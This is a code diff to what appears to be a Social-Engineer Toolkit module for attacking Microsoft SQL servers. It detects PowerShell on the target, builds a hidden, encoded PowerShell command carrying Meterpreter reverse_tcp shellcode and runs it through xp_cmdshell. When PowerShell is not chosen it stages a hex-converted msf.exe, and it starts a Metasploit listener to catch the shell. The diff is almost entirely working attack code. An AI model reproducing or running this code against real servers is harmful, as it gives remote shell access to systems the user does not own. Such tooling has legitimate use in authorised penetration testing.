@@ -103,8 +103,12 @@ def deploy_hex2binary(ipaddr,port,username,password):
     match = re.search("parameter version", bundle)
     # if we have a match we have powershell installed
     if match:
-        print_status("Powershell was identified, targeting server through powershell injection.")
-        option = "1"
+        print_status("Powershell was detected on the remote system.")
+        option_ps = raw_input("Do you want to use powershell injection? [yes/no]:")
+        if option_ps == "" or option_ps == "y" or option_ps == "yes":
+            option = "1"
+            print_status("Powershell delivery selected. Boom!")
+        else: option = "2"
     # otherwise, fall back to the older version using debug conversion via hex
     else:
         print_status("Powershell not detected, attempting Windows debug method.")
@@ -123,9 +127,13 @@ def deploy_hex2binary(ipaddr,port,username,password):
         if not os.path.isfile(setdir + "/set.payload"):
             if operating_system == "posix":
                 web_path = (setdir)
-                subprocess.Popen("cp %s/msf.exe %s/ 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
-                subprocess.Popen("cp %s//msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
-        fileopen = file("%s/msf.exe" % (web_path), "rb")
+                # if it isn't there yet
+                if not os.path.isfile(setdir + "/1msf.exe"):
+                    # move it then
+                    subprocess.Popen("cp %s/msf.exe %s/1msf.exe" % (setdir, setdir), shell=True).wait()
+                subprocess.Popen("cp %s/1msf.exe %s/ 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
+                subprocess.Popen("cp %s/msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
+        fileopen = file("%s/1msf.exe" % (web_path), "rb")
         # read in the binary
         data = fileopen.read()
         # convert the binary to hex
@@ -152,7 +160,7 @@ def deploy_hex2binary(ipaddr,port,username,password):
     #
 
     if option == "1":
-        print_status("Using powershell x86 process downgrade attack..")
+        print_status("Using universal powershell x86 process downgrade attack..")
         payload = "x86"
 
         # specify ipaddress of reverse listener
@@ -163,6 +171,10 @@ def deploy_hex2binary(ipaddr,port,username,password):
         update_options("PORT=" + port)
         update_options("POWERSHELL_SOLO=ON")
         print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
+        filewrite = file(setdir + "/payload_options.shellcode", "w")
+        # format needed for shellcode generation
+        filewrite.write("windows/meterpreter/reverse_tcp" + " " + port + ",")
+        filewrite.close()
         try: reload(src.payloads.powershell.prep)
         except: import src.payloads.powershell.prep
         # create the directory if it does not exist
@@ -171,7 +183,7 @@ def deploy_hex2binary(ipaddr,port,username,password):
 
         x86 = file(setdir + "/x86.powershell", "r")
         x86 = x86.read()
-        x86 = "powershell -nop -win hidden -noni -enc " + x86
+        x86 = "powershell -nop -win hid -noni -enc " + x86
         print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
         filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
         filewrite.write(x86)
@@ -191,6 +203,9 @@ def deploy_hex2binary(ipaddr,port,username,password):
                 except: import pexpect
                 print_status("Starting the Metasploit listener...")
                 child2 = pexpect.spawn("%s/msfconsole -r %s/reports/powershell/powershell.rc" % (msf_path,setdir))
+                print_status("Waiting for the listener to start first before we continue forward...")
+                print_status("Be patient, Metaploit takes a little bit to start...")
+                child2.expect("Starting the payload handler", timeout=30000)
 
         # assign random_exe command to the powershell command
         random_exe = powershell_command
@@ -257,24 +272,22 @@ def deploy_hex2binary(ipaddr,port,username,password):
     # thread is needed here due to the connect not always terminating thread, it hangs if thread isnt specified
     try: reload(thread)
     except: import thread
+
     # execute the payload
     # we append more commands if option 1 is used
-
     if option == "1":
-        print_status("Trigger the powershell injection payload.. ")
-        mssql.sql_query("exec master..xp_cmdshell '%s'" % (powershell_command))
+            print_status("Triggering the powershell injection payload... ")
+            sql_command = ("exec master..xp_cmdshell '%s'" % (powershell_command))            
+            #mssql.sql_query("exec master..xp_cmdshell '%s'" % (powershell_command))
+            thread.start_new_thread(mssql.sql_query, (sql_command,))
 
+    # using the old method
     if option == "2":
+        print_status("Triggering payload stager...")
         sql_command = ("xp_cmdshell '%s'" % (random_exe))
         # start thread of SQL command that executes payload
         thread.start_new_thread(mssql.sql_query, (sql_command,))
         time.sleep(1)
-
-    # pause to let metasploit launch - real slow systems may need to adjust
-    # i need to rewrite this to do a child.expect on msf and wait until that happens
-    print_status("Pausing 15 seconds to let the system catch up...")
-    time.sleep(15)
-    print_status("Triggering payload stager...")
 
     # if pexpect doesnt exit right then it freaks out
     if os.path.isfile(setdir + "/set.payload"):
